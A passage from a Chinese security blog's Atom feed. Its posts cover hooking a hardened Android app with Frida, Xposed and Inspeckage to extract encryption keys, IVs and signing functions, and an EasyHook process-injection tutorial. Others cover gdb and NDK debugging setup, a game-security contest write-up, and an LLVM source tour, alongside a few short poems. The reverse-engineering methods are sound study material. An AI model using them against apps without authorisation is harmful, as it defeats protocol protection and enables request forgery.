src="/2019/02/25/blackhook/15508048574747.jpg"></p><p>结束时得到一个.trace文件，里面记录了大量的函数调用，这时候需要你的一点经验了，筛选过滤出目标函数，通过该函数的调用上下文来梳理逻辑。<br>项目里的应用会根据订单信息产生一个二维码，尝试搜索“QR”：<br><img src="/2019/02/25/blackhook/15508051556815.jpg" alt="a-w600"><br>运气不错，存在调用createQRImage函数，该函数会由字符串参数指定生成二维码。利用Xposed hook得到一个加密的字符串，猜测是订单信息加密之后得到的。<br>这里说一下，hook方法和工具很多，用frida简单快速，不过对于加固应用，具有反调试，不能直接hook（直接hook是frida的进程ptrace到目标进程，会被kill），frida提供-f选项来让frida产生一个目标进程（这里对某叠词加固的双进程保护有效）。</p><p>想办法得到加密相关信息，一般写加密会用到的两个包，javax.crypto.~和(com.android.)org.bouncycastle那个包，那么搜索相关关键字就行。</p><p><img src="/2019/02/25/blackhook/15508255565094.jpg" alt="b-w600"><br><img src="/2019/02/25/blackhook/15508255648698.jpg" alt="c-w600"></p><p>实际中需要观察涉及到的函数名，有些是自写函数，会直接返回明文、IV、密钥等信息，这些函数hook起来很方便，也不用筛选log，因为自写函数基本都是在业务中的调用。</p><p>从客户那里了解到，请求的包体加密前还要做一下签名，一般做参数签名用到的md5、sha1、sha256这些，也很好hook：<br><img src="/2019/02/25/blackhook/15508259002282.jpg" alt="d-w600"></p><p>ok，拿到对协议参数做处理的函数后，就需要hook来验证，xposed写hook没什么特别的操作（找一个支持加固应用的demo就行，也就是支持multidex）。</p><p><img src="/2019/02/25/blackhook/15508261077649.jpg" alt="e-w600"></p><p><img src="/2019/02/25/blackhook/15508261396429.jpg" alt="f-w300"></p><p>一般知道加密函数、加密模式、密钥、IV后就能模拟应用发包请求了，大部分的应用协议加密类就一个，密钥什么的也都通用，甚至有些本地文件加密也和协议用的是同一个加密类。</p><p>这里推荐一篇<a href="https://la0s.github.io/2018/06/28/Toos2/">博客</a>，介绍了我用到的工具，也让我知道了还有下面要讲的自动化的工具。</p><h3 id="Inspeckage"><a href="#Inspeckage" class="headerlink" title="Inspeckage"></a>Inspeckage</h3><p><a href="https://repo.xposed.info/module/mobi.acpm.inspeckage">下载地址</a></p><p>安装之后，选择要分析的应用，点击“Launch APP”即可：</p><p><img src="/2019/02/25/blackhook/15508266726004.jpg" alt="g-w400"></p><p>本地转发8008端口，就可以打开提供的web视图：</p><p>加密类记录：<br><img src="/2019/02/25/blackhook/15508267996596.jpg" alt="h-w600"></p><p>哈希类记录：<br><img src="/2019/02/25/blackhook/15508269689635.jpg" alt="i-w600"></p><p>自动化的动态分析工具还是很方便的，由于它记录的函数是库中的函数，如果应用中涉及的加密自写了函数，就需要手动hook了，所以两种方法结合着用吧。<br>这里遇到的问题是端口老是掉，需要重新开启端口。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LLVM源代码指南</title>
    <link href="https://f4ncy.top/2018/12/04/llvmguide-1/"/>
    <id>https://f4ncy.top/2018/12/04/llvmguide-1/</id>
    <published>2018-12-04T01:36:39.000Z</published>
    <updated>2018-12-04T10:00:08.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="LLVM源代码指南"><a href="#LLVM源代码指南" class="headerlink" title="LLVM源代码指南"></a>LLVM源代码指南</h1><ul><li>LLVM内核不包括前端，只是“中端”优化器，一堆后端，文档，还有大量辅助代码。像Clang这样的前端被放在单独的项目中。</li><li>核心的LLVM表现在RAM中，并使用大量C++ API进行操作。这种表现方式是可以转储到可读文本并解析回内存，但这只是为了方便调试：在使用LLVM的正常编译期间，永远不会生成文本形式的IR。通常，前端通过调用LLVM API来构建IR，然后运行一些优化PASS，最后调用后端来生成汇编或机器代码。当LLVM代码被存储在磁盘上时（在使用Clang正常编译C/C++时甚至都不会存在这种情况），是以“bitcode”形式存放，是一种紧凑的二进程表示。</li><li>主要的LLVM API文档由doxygen生成，可以在<a href="http://llvm.org/doxygen/index.html">这里</a>找到。除非您已经知道自己在做什么以及在寻找什么（带有目的性的找和看），否侧这些信息很难被利用。以下链接是开始学习LLVM API的教程。</li></ul><p>代码<a href="https://github.com/llvm-mirror/llvm/tree/release_39">根目录</a>，包含以下：</p><ol><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/bindings">bindings</a>允许从C++以外的编程语言使用LLVM API。存在比这更多的bindings，包括C（我们将稍后介绍）和Haskell（<a href="https://hackage.haskell.org/package/llvm-general">目录之外</a>）。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/cmake">cmake</a>:LLVM现在使用CMake而不是autoconf。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/docs">docs</a>ReStructuredText格式。请参阅<a href="https://github.com/llvm-mirror/llvm/blob/release_39/docs/LangRef.rst">语言参考手册</a>，它定义了每个LLVM指令的含义。<a href="https://github.com/llvm-mirror/llvm/tree/release_39/docs/tutorial">tutorial</a>子目录中的素材特别有趣，但不要在那里看，而是去<a href="http://llvm.org/docs/tutorial/">这里</a>。这是学习LLVM最好的方式。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/examples">examples</a>:这是教程配套的源代码。作为LLVM hacker，应该尽可能地从这里抠代码、CMakeLists.txt等。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/include">include</a>:第一个子目录<a href="https://github.com/llvm-mirror/llvm/tree/release_39/include/llvm-c">llvm-c</a>包含了C的binding（作者曰：我从没使用过，但是看起来十分可靠）。重要的是，LLVM试图保持这些binding不变，而C++ API在不同版本中发生较大变化，尽管过去几年中变化的步伐已经放缓。第二个子目录<a href="https://github.com/llvm-mirror/llvm/tree/release_39/include/llvm">llvm</a>是个大头：它包含878个头文件，用于定义所有LLVM API。一般来说，使用这些文件的doxygen版本而不是直接读取他们会更容易，但我经常最后使用这些文件来查找某些功能。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib">lib</a>包含了真正的好东西，我们之后会单独看一下。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/projects">projects</a>默认是不包含任何内容，但是可以在其中查看LLVM组件，例如compiler-rt（清理程序之类的运行时库），OpenMP support，以及位于单独repo中的LLVM C++库。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/resources">resources</a>一些Visual C++的东西，并不关心（用于Windows二进制文件的版本资源定义）。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/runtimes">runtimes</a>:外部项目的另一个占位符，在不久前加入。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/test">test</a>:它也是一个大头，它包含了数以千计的LLVM单元测试，它们在构建检查目标时运行。其中大多数是包含LLVM IR文本版本的.ll文件。会测试比如说，一个优化pass是否能得到预期结果。我将在即将发布的博客中详细介绍LLVM的测试。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/tools">tools</a>:LLVM本身只是一个库的集合，没有任何特定的主要功能。tools目录的大多数子目录都包含一个链接LLVM库的可执行工具。例如，llvm-dis是从bitcode到文本汇编格式的反汇编程序。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/unittests">unittests</a>:更多单元测试，也是在检查构建目标时运行。这些是使用Google Test框架直接调用API的C++文件，而不像“test”目录里的部分，通过运行汇编程序，反汇编程序或优化程序等内容来间接调用LLVM功能。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/utils">utils</a>:用于LLVM编码约定的emacs和vim模式；一个Valgrind suppression文件，以Valgrind监视所有子进程的方式在运行make check时消除误报；支持单元测试的lit和FileCheck工具；还有很多其他随机的东西。</li></ol><p>以下是跳过的“lib”目录，它包含了所有的重要内容，现在看一下它的子目录：</p><ol><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Analysis">Analysis</a>包含许多静态Analysis，可以在编译器教科书中阅读这些Analysis，例如别名分析和全局值编号。某些Analysis是基于LLVM pass，必须由pass manager运行。其他的是基于library，能够直接调用。Analysis中一个奇怪的成员是InstructionSimplify.cpp，这是一个转换器，而不是分析器；我相信有人可以发表评论来解释它在这里做了什么（见<a href="#comment-19005">评论</a>）。我将在后续帖子中深入研究这个目录。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/AsmParser">AsmParser</a>:将文本IR解析道内存中。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Bitcode">Bitcode</a>:将IR序列化为紧凑格式并将其读回RAM。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/CodeGen">CodeGen</a>:LLVM目标无关的代码生成器，基本上是LLVM后端适配的一个框架，也是后端可以使用的一堆库函数。这里有太多太多东西了（&gt;100 KLOC）不幸作者也不完全了解。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/DebugInfo">DebugInfo</a>是一个用户维护LLVM指令和源代码位置之间映射的库。在2014年LLVM开发者大会的演讲中，这些<a href="http://llvm.org/devmtg/2014-10/Slides/Christopher-DebugInfoTutorial.pdf">slides</a>中有很多有用的信息。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/ExecutionEngine">ExecutionEngine</a>:虽然LLVM通常被转换为汇编代码或机器码，但它可以使用解释器直接执行。作者最后一次使用它时，non-jitting解释器并不是十分有效，但是无论如何它比运行jitted代码慢地多。最新的<a href="http://llvm.org/devmtg/2016-11/#talk1">JIT API</a>。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Fuzzer">Fuzzer</a>:这是一个类似于<a href="http://lcamtuf.coredump.cx/afl/">AFL</a>的coverage-guided fuzzer。它不是fuzz LLVM组件，而是作为LLVM功能对由LLVM编译得到的程序进行模糊测试。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/IR">IR</a>:一些与IR相关代码，没有其他明显的统一主题。有用于将IR转换为文本格式的代码，有用于升级由早期版本的LLVM创建的bitcode文件，有用于在创建IR节点时折叠常量等。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/IRReader">IRReader</a>, <a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/LibDriver">LibDriver</a>, <a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/LineEditor">LineEditor</a>:nobody care about these.</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Linker">Linker</a>:一个LLVM模块（就像C/C++的编译单元），包含函数和变量。LLVM Linker将多个模块组合到一个更大的模块中。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/LTO">LTO</a>:链接时优化（许多博客文章和博士论文的主题）允许汇编优化联系独立编译所创建的边界。LLVM可以无花销地进行链接时优化，链接器创建一个大模块，然后使用常规优化PASS来优化。这曾经是首选的方法，但它不能扩展到大型项目。目前采用的方法是<a href="http://blog.llvm.org/2016/06/thinlto-scalable-and-incremental-lto.html">ThinLTO</a>，它以很小的代价获得很大的效益。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/MC">MC</a>:编译器通常发出汇编代码，让汇编程序处理创建机器代码。LLVM中的<a href="http://blog.llvm.org/2010/04/intro-to-llvm-mc-project.html">MC子系统</a>切断了中间过程并直接生成机器代码。这可以加快编译速度，在LLVM用作JIT编译器时尤其有用。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Object">Object</a>:处理目标文件格式的详细信息，例如ELF。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/ObjectYAML">ObjectYAML</a>:ObjectYAML似乎支持将对象文件编码为<a href="http://llvm.org/docs/YamlIO.html">YAML</a>。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Option">Option</a>:命令行解析。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Passes">Passes</a>:PASS管理器的一部分，它调度和排序LLVM PASS，将其依赖关系和无效性考虑在内。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/ProfileData">ProfileData</a>:读取和写入配置文件数据以支持配置文件引导的优化。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Support">Support</a>:其他支持代码包括APInts（在LLVM中普遍使用的任意精度整数）等等。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/TableGen">TableGen</a>:一种<a href="http://llvm.org/docs/TableGen/">工具</a>（作者称其为古怪的瑞士军刀），它输入.td文件（其中LLVM中有200多个）包含结构化数据，并使用特定于域的后端发出由LLVM编译的C++代码。例如，TableGen被用来提取一些实现汇编器和反汇编器中单调的东西。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Target">Target</a>:这里有后端中指定特定处理器的部分。有很多TableGen文件。</li><li><a href="https://github.com/llvm-mirror/llvm/tree/release_39/lib/Transforms">Transforms</a>:这是我最喜欢的目录，它是中端优化器所在的地方。IPO包含跨越函数边界的过程间优化，它们通常不会过于激进，因为它们必须查看大量代码。InstCombine是LLVM的窥视优化器的野兽。Instrumentation支持sanitizers。ObjCARC支持这一点。Scalar包含一堆教科书式的编译器各种优化器，我会尝试在某个时候写一篇关于这个目录内容的更详细的帖子。Utils是帮助代码。Vectorize是LLVM的自动矢量化器，近年来已成为许多工作的主题。</li></ol><p><span id="comment-19005">它不会改变IR本身。llvm::SumplifyInstruction的规则是它只能返回程序中的常量或现有值，这符合Analysis的要求。在每条指令上调用SimplifyInstruction的PASS是lib/Transforms/Utils/SimplifyInstructions.cpp里的转换器PASS。</span></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>FileMonitorHook例子(translate)</title>
    <link href="https://f4ncy.top/2018/09/01/EasyHook/"/>
    <id>https://f4ncy.top/2018/09/01/EasyHook/</id>
    <published>2018-09-01T08:35:29.000Z</published>
    <updated>2018-09-04T06:15:37.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="EasyHook-FileMonitorHook"><a href="#EasyHook-FileMonitorHook" class="headerlink" title="EasyHook-FileMonitorHook"></a>EasyHook-FileMonitorHook</h1><h3 id="创建远程文件监视器"><a href="#创建远程文件监视器" class="headerlink" title="创建远程文件监视器"></a>创建远程文件监视器</h3><p>在本教程中，我们将使用EasyHook创建一个远程文件监视器。<br>我们将介绍如何：<br>根据进程ID将托管程序集注入现有目标进程,使用可执行文件路径将托管程序集注入新创建（并暂停）的进程<br>在远程进程中创建本地挂钩以监视3个文件操作（CreateFile，ReadFile和WriteFile）,使用.NET进程间通信（IPC）将报告文件访问回主控制台应用程序.</p><p>在本教程中，我们将创建一个包含两个项目的解决方案：<br>FileMonitor：一个C＃控制台应用程序;<br>FileMonitorHook：包含钩子逻辑和IPC接口的C＃类库。该组件是我们的注入payload。</p><h3 id="Remote-hooking-概述"><a href="#Remote-hooking-概述" class="headerlink" title="Remote hooking 概述"></a>Remote hooking 概述</h3><p>远程hook通常先用“injector”向目标进程注入一个payload，利用这个payload再安装我们的钩子。<br>由此，EasyHook库提供了“EasyHook.RemoteHooking”静态类和“EasyHook.IEntryPoint”接口。</p><ol><li>EasyHook.RemoteHooking.Inject:<br> 向指定的进程注入特定的32位/64位payload指令集，提供的参数将被传递给被注入的库。</li><li>EasyHook.RemoteHooking.CreateAndInject:<br> 从提供的可执行路径和命令行以挂起状态创建一个新进程，然后以“Inject”方式注入一个特定的32位/64位payload。</li><li>EasyHook.RemoteHooking.WakeUpProcess:<br> 与payload/注入库中的CreateAndInject结合使用，以在准备就绪时唤醒进程。</li><li>EasyHook.RemoteHooking.IpcCreateServer<T>:<br> 一个用来初始化injector和host的IPC通道的辅助方法。</T></li><li>EasyHook.RemoteHooking.IpcConnectClient<T>:<br> 一个用来在注入完成后将客户端连接至IPC通道的辅助方法。（被运行在目标进程中的注入的dll所调用）</T></li><li>EasyHook.IEntryPoint:<br> payload指令集必须包含一个public类来实现此接口。</li></ol><p>待完成注入后payload将使用EasyHook.LocalHook来创建钩子。</p><h3 id="EasyHook-RemoteHooking-Inject"><a href="#EasyHook-RemoteHooking-Inject" class="headerlink" title="EasyHook.RemoteHooking.Inject"></a>EasyHook.RemoteHooking.Inject</h3><ul><li>1.&emsp;EasyHook.RemoteHooking.Inject 序列化配置，包括payload集合的路径和参数。</li><li>2.&emsp;向指定的目标进程中注入原生EasyHook32.dll或EasyHook64.dll依赖于它本身是32位或64位。如果有必要的话，EasyHook将自动使用EasyHookSvc32/64.exe来帮助程序将32位注入到64位中或反过来。  EasyHook.RemoteHooking.Inject 将会等待，直到它超时或者它已经发出注入已完成/失败的信号。</li></ul><p>– 此时已运行在目标进程中 –</p><ul><li><p>3.&emsp;EasyHook32/64.dll通过加载EasyLoad32/64.dll来完成“managed injection”<br>（EasyLoad尝试创建一个新的AppDomain，以便可以卸载注入库）<br>（EasyHook32/64.dll发出EasyHook.RemoteHooking.Inject注入完成的信号）</p></li><li><p>4.&emsp;EasyLoad将托管程序集EasyHook.dll加载到目标进程并调用EasyHook.InjectionLoader.Main方法。</p></li><li><p>5.&emsp;EasyHook.InjectionLoader反序列化配置，加载有效负载程序集并查找与提供给EasyHook.RemoteHooking.Inject调用的参数相匹配的EasyHook.IEntryPoint。</p></li><li><p>6.&emsp;如果找到，就会实例化payload集合中相匹配的EasyHook.IEntryPoint并最终调用对应的Run方法。</p></li><li><p>7.&emsp;Payload的Run方法安装若干钩子。</p></li></ul><p>&emsp;&emsp;&emsp;&emsp;最后当Run方法退出后，EasyLoad将会尝试卸载AppDomain</p><h3 id="EasyHook-RemoteHooking-CreateAndInject"><a href="#EasyHook-RemoteHooking-CreateAndInject" class="headerlink" title="EasyHook.RemoteHooking.CreateAndInject"></a>EasyHook.RemoteHooking.CreateAndInject</h3><ol><li>从提供的可执行路径和命令行以挂起状态创建一个新进程。</li><li>按照EasyHook.RemoteHooking.Inject的运行逻辑。</li><li>被创建的进程会保持被挂起的状态直到payload调用RemoteHooking.WakeUpProcess。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>望</title>
    <link href="https://f4ncy.top/2018/08/03/play20180803/"/>
    <id>https://f4ncy.top/2018/08/03/play20180803/</id>
    <published>2018-08-03T06:16:31.000Z</published>
    <updated>2018-08-07T06:45:43.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><p>四周张望，空旷得慌张；看着远方，残云里惘惘。你的出现，拉近了我的焦点。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
      <category term="play" scheme="https://f4ncy.top/categories/play/"/>
    
    
  </entry>
  
  <entry>
    <title>远</title>
    <link href="https://f4ncy.top/2018/08/01/play201808012/"/>
    <id>https://f4ncy.top/2018/08/01/play201808012/</id>
    <published>2018-08-01T04:24:22.000Z</published>
    <updated>2018-08-02T04:18:50.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><p>遇了越来越多的人，说着越来越少的话，在越来越小的屋子里，等着越来越远的云。<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;梦见越来越模糊的你。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
      <category term="play" scheme="https://f4ncy.top/categories/play/"/>
    
    
  </entry>
  
  <entry>
    <title>意</title>
    <link href="https://f4ncy.top/2018/08/01/play20180801/"/>
    <id>https://f4ncy.top/2018/08/01/play20180801/</id>
    <published>2018-08-01T01:37:08.000Z</published>
    <updated>2018-08-01T04:38:14.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><p>蝉，吵得身临其境。雪，下得记忆犹新。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
      <category term="play" scheme="https://f4ncy.top/categories/play/"/>
    
    
  </entry>
  
  <entry>
    <title>NDK gdb插件——peda-arm</title>
    <link href="https://f4ncy.top/2018/07/23/androidgdbplus/"/>
    <id>https://f4ncy.top/2018/07/23/androidgdbplus/</id>
    <published>2018-07-23T06:38:24.000Z</published>
    <updated>2019-02-25T03:37:25.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="NDK-gdb插件——peda-arm"><a href="#NDK-gdb插件——peda-arm" class="headerlink" title="NDK gdb插件——peda-arm"></a>NDK gdb插件——peda-arm</h1><p>gdb调试时配合插件可以提高效率，Linux下gdb调试可以使用peda、gef等。在android调试里，使用gdbserver配合gdb可以远程调试，那有没有对应的插件呢？<br>最近发现一款支持arm的插件，是peda改的，<a href="https://github.com/alset0326/peda-arm">peda-arm</a>.</p><h2 id="安装流程"><a href="#安装流程" class="headerlink" title="安装流程"></a>安装流程</h2><p>从github上拉下来后，直接把文件夹复制过去。<br>gdb的目录(MACOS)是：<br><code>/Users/username/Library/Android/sdk/ndk-bundle/prebuilt/darwin-x86_64/bin</code><br>反正在ndk的目录下。<br>把clone下来的文件夹复制进去。<br><img src="/2018/07/23/androidgdbplus/15323283415621.jpg" alt="w100"></p><p>修改初始化配置文件:<br><code>echo “source ./peda-arm/peda-arm.py” &gt;&gt; ./.gdbinit</code></p><h2 id="启动调试"><a href="#启动调试" class="headerlink" title="启动调试"></a>启动调试</h2><p>把gdbserver上传到手机后：<br><code>gdbserver remote:port --attach targetpid</code></p><p>本地端口转发<br><code>adb forward tcp:port tcp:port</code></p><p>gdb调试<br><code>./gdb</code><br><code>target remote:port</code></p><p><img src="/2018/07/23/androidgdbplus/15323286476307.jpg" alt="w100"></p><p>这用就OK啦。</p><p>Debug for fun～</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>腾讯游戏安全技术竞赛决赛第一题writeup</title>
    <link href="https://f4ncy.top/2018/05/04/mtp2/"/>
    <id>https://f4ncy.top/2018/05/04/mtp2/</id>
    <published>2018-05-04T08:07:53.000Z</published>
    <updated>2019-02-25T03:59:29.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="腾讯游戏安全技术竞赛决赛第一题writeup"><a href="#腾讯游戏安全技术竞赛决赛第一题writeup" class="headerlink" title="腾讯游戏安全技术竞赛决赛第一题writeup"></a>腾讯游戏安全技术竞赛决赛第一题writeup</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目是用OpenGL ES 3.0编写的一个程序，用<code>textures/container.jpg</code>作为贴图，去渲染。目的是去寻找绘制出的flag，由于绘制区域限制，移动不到绘制区域。</p><h2 id="做题过程"><a href="#做题过程" class="headerlink" title="做题过程"></a>做题过程</h2><p>之前没有接触过openGL，相关函数一个个找，浏览了《opengl es 3.0 编程指南》。</p><p>贴图绑定：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sub_30604(v23);</span><br><span class="line">dword_AA108 = v23;</span><br><span class="line">_aeabi_memcpy8(&amp;v48, dword_A1AA0, 720);</span><br><span class="line">glGenVertexArrays(1, &amp;v38);</span><br><span class="line">glGenBuffers(1, &amp;v39);</span><br><span class="line">glBindVertexArray(v38);</span><br><span class="line">glBindBuffer(0x8892, v39);</span><br><span class="line">glBufferData(0x8892, 720, &amp;v48, 35044);</span><br><span class="line">glVertexAttribPointer(0, 3, 0x1406, 0, 20, 0);</span><br><span class="line">glEnableVertexAttribArray(0);</span><br><span class="line">glVertexAttribPointer(1, 2, 5126, 0, 20, 12);</span><br><span class="line">glEnableVertexAttribArray(1);</span><br><span class="line">glGenTextures(1, &amp;textures);</span><br><span class="line">glBindTexture(0xDE1u, textures);</span><br><span class="line">glTexParameteri(0xDE1u, 0x2802u, 10497);</span><br><span class="line">glTexParameteri(0xDE1u, 0x2803u, 10497);</span><br><span class="line">glTexParameteri(0xDE1u, 0x2801u, 9729);</span><br><span class="line">glTexParameteri(0xDE1u, 0x2800u, 9729);</span><br><span class="line">pixels = (const GLvoid *)sub_31578(v42, v43, &amp;v35, &amp;v34, &amp;v33, 0);</span><br><span class="line">      if ( pixels )</span><br><span class="line">      &#123;</span><br><span class="line">        glTexImage2D(0xDE1u, 0, 6407, *(GLsizei *)&amp;v35, v34, 0, 0x1907u, 0x1401u, pixels);</span><br><span class="line">        glGenerateMipmap(3553);</span><br><span class="line">      &#125;</span><br><span class="line">      j_j_free(pixels);</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>将<code>textures/container.jpg</code>作为贴图纹理，<code>dword_A1AA0</code>为顶点数组（36个坐标），得到的结果就是一个立方体（以三角形为单位渲染，6* 2 *3=36）。</p><p>在程序中看到一个箭头上布满了箱子，就是以图片纹理渲染出的箱子来布满箭头。</p><p>找到的资料都是单个图像渲染，没找到怎么设置贴图目标。</p><p>找屏幕显示的地方，sub_30098里看到屏幕清除的函数，下面是一大堆浮点运算。该不会是逆浮点运算过程吧？？<br>找了一下数据来源：<code>dword_AA0FC</code><br>在so的init里找到了函数，里面是对着色器代码的复制，还有就是<code>dword_AA0FC</code>的赋值，数据来源就是<code>dword_9E8D8</code>。一堆数据，分析之后是浮点数，联系之前顶点坐标也是浮点数组，那么这也是个坐标数组。</p><p>一番搜索，glDrawElements和glDrawArrays是绘制函数，在绘制前，调用<code>glUniformMatrix4fv</code>,通过uniform上传至GPU,来绘制最终的图像。调试中发现传入的指针指向的是空数组。不清楚为什么。从代码来看就是将，dword_AA0FC传入的数据，每个循环处理x和y坐标。刚刚那个座标是一个三维坐标。</p><p>没仔细研究一大段的浮点运算具体是干什么的，猜测是三维到二维的映射计算。</p><p>把dword_9E8D8数据抠出来。用matplotlib绘制出来。哇！惊喜，这个坐标数组就是绘制图像的坐标数组。</p><p><img src="/2018/05/04/mtp2/15254223943601.jpg"></p><p>由于旧的题里出现了flag的图片，还是给了不少启示的，所以这题做的还是有点侥幸的。</p><h2 id="OpenGL相关"><a href="#OpenGL相关" class="headerlink" title="OpenGL相关"></a>OpenGL相关</h2><p>有关OpenGL的知识，需要了解一下几个概念。<br>这个系列文章写的不错：<a href="http://www.cnblogs.com/lijihong/p/5365677.html">http://www.cnblogs.com/lijihong/p/5365677.html</a></p><h3 id="vertex-顶点"><a href="#vertex-顶点" class="headerlink" title="vertex(顶点)"></a>vertex(顶点)</h3><p>在设置贴图映射和绘制对象时会用到顶点。</p><p>例如在贴图映射中，会指定贴图所需要映射方式的一个顶点数组。如下是一个浮点数组。<br><img src="/2018/05/04/mtp2/15262860614297.jpg"></p><h3 